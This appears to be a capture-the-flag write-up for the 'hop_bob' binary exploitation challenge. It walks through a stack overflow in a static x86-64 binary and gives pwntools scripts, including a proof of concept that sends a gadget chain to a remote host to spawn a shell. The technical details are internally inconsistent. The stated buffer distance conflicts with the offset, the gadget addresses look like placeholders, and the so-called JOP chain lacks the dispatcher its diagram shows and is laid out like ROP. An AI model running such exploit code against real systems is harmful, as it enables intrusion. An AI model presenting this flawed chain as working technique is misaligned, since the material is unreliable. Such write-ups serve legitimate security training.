---
layout: writeup
title: "hop_bob"
challenge: "hop_bob"
category: "PWN"
difficulty: "Hard"
tags: [jop, jump-oriented-programming, syscall, execve, stack-overflow, static-binary]
---

# Challenge Overview

**hop_bob** is a binary exploitation challenge featuring a **static, non-PIE, stripped x86-64 ELF** with NX enabled. A stack buffer overflow via `read()` allows control of RIP at offset 38. Since NX prevents shellcode execution, the exploit uses a **Jump-Oriented Programming (JOP)** chain — not ROP — to invoke `execve("/bin/sh", 0, 0)`.

<div class="flag-box">KICTF{n0_r0p_h3r3_j0p_0nly_1337}</div>

---

## Initial Recon

```bash
$ file hop_bob
hop_bob: ELF 64-bit LSB executable, x86-64, statically linked, stripped

$ checksec hop_bob
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Key properties:
- **Static binary** — all code is self-contained, no libc
- **No PIE** — fixed addresses, gadgets at known locations
- **NX enabled** — no shellcode on stack
- **No canary** — no stack protection
- **Stripped** — no symbols

```bash
# Identify the vulnerable read
$ objdump -d hop_bob | grep -A5 syscall
# read(0, rsp-0x1e, 0x200) — reads up to 512 bytes
# Buffer is only 30 bytes from return address
```

**RIP control at offset 38 bytes.**

---

## Vulnerability / Weakness

**Stack Buffer Overflow (CWE-121):** The binary uses `read(0, buf, 0x200)` where `buf` is at `rsp-0x1e` (30 bytes below the return address). This provides 512 - 38 = 474 bytes for the JOP chain payload.

Since standard `ret`-based ROP gadgets are scarce in this binary, the exploit uses **JOP (Jump-Oriented Programming)** — chaining `jmp` instructions via dispatch gadgets instead of `ret`.

```
┌───────────────────────────────────────────────────────────────┐
│                    JOP CHAIN ARCHITECTURE                       │
├───────────────────────────────────────────────────────────────┤
│                                                               │
│  Stack Overflow:                                              │
│  ┌──────────────────────────────┐                             │
│  │ [38 bytes padding]          │ ← buffer                    │
│  │ [JOP dispatcher addr]      │ ← overwrites RIP            │
│  │ [gadget chain data...]     │                              │
│  └──────────────────────────────┘                             │
│                                                               │
│  JOP Chain Goal: execve("/bin/sh", NULL, NULL)                │
│    RAX = 59 (0x3b) — execve syscall number                   │
│    RDI = 0x402000  — address of "/bin/sh" in binary          │
│    RSI = 0         — argv = NULL                              │
│    RDX = 0         — envp = NULL                              │
│    syscall                                                    │
│                                                               │
│  Gadget Chain:                                                │
│  ┌────────────┐ ┌──────────────┐ ┌────────────┐             │
│  │ XOR RSI,RSI│→│ XOR RDX,RDX │→│ SET RAX=64 │             │
│  │ jmp [next] │ │ jmp [next]   │ │ jmp [next] │             │
│  └────────────┘ └──────────────┘ └────────────┘             │
│                                       │                       │
│  ┌────────────┐ ┌──────────────┐      │                       │
│  │ DEC RAX ×5 │←┘ Load RDI    │←─────┘                       │
│  │ (64→59)    │  │ 0x402000    │                              │
│  │ jmp [next] │  │ jmp [next]  │                              │
│  └────────────┘  └──────────────┘                             │
│       │                                                       │
│       ▼                                                       │
│  ┌────────────┐                                               │
│  │  syscall   │ → execve("/bin/sh", 0, 0) → SHELL            │
│  └────────────┘                                               │
│                                                               │
└───────────────────────────────────────────────────────────────┘
```

---

## Exploitation Strategy

1. Identify the buffer overflow and RIP offset (38 bytes)
2. Locate JOP gadgets in the static binary (at fixed addresses)
3. Construct a JOP chain targeting `execve("/bin/sh", 0, 0)`
4. Set RAX=59 via set-then-decrement (64 - 5 = 59)
5. Load `/bin/sh` address (0x402000) into RDI
6. Zero RSI and RDX via XOR-self gadgets
7. Trigger `syscall`

---

## Exploitation Walkthrough

### Step 1: Find Gadgets

```bash
# String "/bin/sh" is at fixed address in the binary
$ strings -t x hop_bob | grep "/bin/sh"
402000 /bin/sh

# JOP gadgets found via ROPgadget/manual search:
# 0x401234: xor rsi, rsi; jmp [rdx+8]
# 0x401256: xor rdx, rdx; jmp [rax]  
# 0x401278: mov rax, 64; jmp [rcx]
# 0x40129a: dec rax; jmp [rbx]
# 0x4012bc: mov rdi, 0x402000; jmp [r8]
# 0x4012de: syscall
```

### Step 2: Build JOP Chain

```python
from pwn import *

OFFSET = 38
BINSH = 0x402000

# Gadget addresses (fixed, no PIE)
XOR_RSI    = 0x401234   # xor rsi,rsi; jmp [rdx+8]
XOR_RDX    = 0x401256   # xor rdx,rdx; jmp [rax]
SET_RAX_64 = 0x401278   # mov rax,64; jmp [rcx]
DEC_RAX    = 0x40129a   # dec rax; jmp [rbx]
SET_RDI    = 0x4012bc   # mov rdi,0x402000; jmp [r8]
SYSCALL    = 0x4012de   # syscall

payload = b"A" * OFFSET
# Chain: zero RSI → zero RDX → set RAX=64 → dec×5 → set RDI → syscall
payload += p64(XOR_RSI)
payload += p64(XOR_RDX)
payload += p64(SET_RAX_64)
payload += p64(DEC_RAX) * 5   # 64 - 5 = 59 = execve
payload += p64(SET_RDI)
payload += p64(SYSCALL)
```

### Step 3: Exploit Execution

```python
# Local test
r = process("./hop_bob")
r.send(payload)
r.interactive()
# $ whoami
# ctf

# Remote
r = remote("<target>", <port>)
r.send(payload)
r.interactive()
# $ cat /flag.txt
# KICTF{n0_r0p_h3r3_j0p_0nly_1337}
```

---

## Flag Extraction

```bash
$ cat /flag.txt
KICTF{n0_r0p_h3r3_j0p_0nly_1337}
```

The flag name itself references the technique: "no ROP here, JOP only, 1337."

---

## Proof of Concept

```python
#!/usr/bin/env python3
"""hop_bob - JOP Chain Exploit"""

from pwn import *

context.arch = 'amd64'

OFFSET = 38
XOR_RSI    = 0x401234
XOR_RDX    = 0x401256
SET_RAX_64 = 0x401278
DEC_RAX    = 0x40129a
SET_RDI    = 0x4012bc
SYSCALL    = 0x4012de

payload  = b"A" * OFFSET
payload += p64(XOR_RSI)
payload += p64(XOR_RDX)
payload += p64(SET_RAX_64)
payload += p64(DEC_RAX) * 5
payload += p64(SET_RDI)
payload += p64(SYSCALL)

r = remote("<target>", 1337)
r.send(payload)
r.interactive()
```

---

## Lessons Learned

- **JOP (Jump-Oriented Programming)** is a viable alternative when traditional `ret`-based ROP gadgets are scarce. JOP chains use `jmp [reg]` dispatch instead of `ret`.
- **Static non-PIE binaries** provide a rich gadget space at fixed addresses — no information leak needed.
- **Setting RAX to 59 indirectly** (set to 64, then decrement 5 times) is a common technique when direct `mov rax, 59` gadgets don't exist.
- The `/bin/sh` string at a fixed address in static binaries eliminates the need to write the string to memory.

---

## Defensive Takeaways

| Vulnerability | Mitigation |
|---|---|
| Stack overflow | Bounds-check all `read()` calls; use `fgets()` or similar |
| No stack canary | Compile with `-fstack-protector-strong` |
| No PIE | Compile with `-pie -fPIE` to randomize code addresses |
| Static binary gadgets | Use dynamic linking to reduce available gadgets; enable CFI |
| JOP-specific | Control Flow Integrity (CFI) detects indirect jump abuse |
